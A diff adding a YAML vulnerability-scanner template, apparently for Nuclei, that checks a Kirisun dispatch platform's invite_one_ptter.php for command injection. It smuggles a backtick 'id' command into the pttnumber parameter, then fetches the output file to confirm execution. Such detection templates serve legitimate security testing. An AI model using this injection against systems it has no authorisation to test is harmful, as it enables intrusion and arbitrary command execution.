@@ -1,0 +1,52 @@
+id: poc-yaml-kirisun-invite-one-ptter-php-command-injection
+info:
+  name: 福建科立讯通信 指挥调度管理平台 invite_one_ptter.php 命令注入漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: command-injection
+
+variables:
+  t1: '{{rand_base(4)}}'
+
+flow: http(1) && http(2)
+
+http:
+  - id: check-injection
+    method: GET
+    path:
+      - '{{BaseURL}}/api/client/ptt/invite_one_ptter.php?callee=all&caller=1&pttnumber=`id>{{t1}}.txt`&force=1&timeout=1'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{"st":"0"}'
+        part: body
+      - type: word
+        words:
+          - '<'
+        part: body
+        negative: true
+
+  - id: verify-injection
+    method: GET
+    path:
+      - '{{BaseURL}}/api/client/ptt/{{t1}}.txt'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'uid='
+          - 'gid='
+          - 'groups='
+        part: body
+      - type: word
+        words:
+          - '<'
+        part: body
+        negative: true
